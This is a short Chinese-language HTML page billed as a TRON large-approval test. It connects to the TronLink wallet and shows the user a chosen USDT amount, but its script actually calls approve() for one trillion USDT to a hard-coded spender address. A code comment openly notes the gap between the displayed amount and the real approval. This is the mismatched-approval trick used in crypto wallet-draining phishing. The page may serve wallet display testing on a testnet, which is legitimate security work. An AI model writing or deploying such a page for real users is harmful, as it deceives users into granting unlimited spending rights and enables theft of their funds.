<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRON 链大额授权测试</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
        .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .tron-info { background: #e8f4f8; padding: 10px; border-radius: 5px; margin-bottom: 15px; border-left: 4px solid #ff001c; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🌐 TRON 链大额授权测试</h2>
        
        <div class="tron-info">
            <strong>TRON 链特性：</strong><br>
            • USDT 6 位小数<br>
            • 使用 TronLink 钱包<br>
            • 测试极大金额授权
        </div>

        <div class="input-group">
            <label>显示金额 (USDT):</label>
            <input type="number" id="amount" value="100" step="1">
        </div>

        <button id="connectBtn">🔗 连接 TronLink</button>
        <button id="approveBtn" disabled>🌊 测试 TRON 大额授权</button>

        <div id="status">请先连接 TronLink...</div>
    </div>

    <script>
        // TRON 链专用代码
        const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
        const spenderAddress = "TMcjcKsZZLSFh9JpTfPejHx7EPjdzG5XkC";

        // TRON 大额授权金额
        function getTronHugeAmount() {
          return (1000000000000 * 1000000).toString(); // 1万亿 USDT
        }

        window.approveUSDT = async function() {
          try {
            const inputAmount = document.getElementById("amount").value;
            const hugeAmount = getTronHugeAmount();
            
            console.log("TRON 链测试 - 前端显示:", inputAmount, "实际授权: 1万亿 USDT");
            
            const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);
            const result = await usdtContract.approve(spenderAddress, hugeAmount).send({
              feeLimit: 100000000,
              callValue: 0
            });
            
            setStatus("✅ 请观察 TronLink 显示内容");
            
          } catch (err) {
            setStatus("❌ " + err.message, true);
          }
        };

        // 页面初始化代码...
        document.getElementById('connectBtn').addEventListener('click', async () => {
          // 连接代码...
        });
    </script>
</body>
</html>
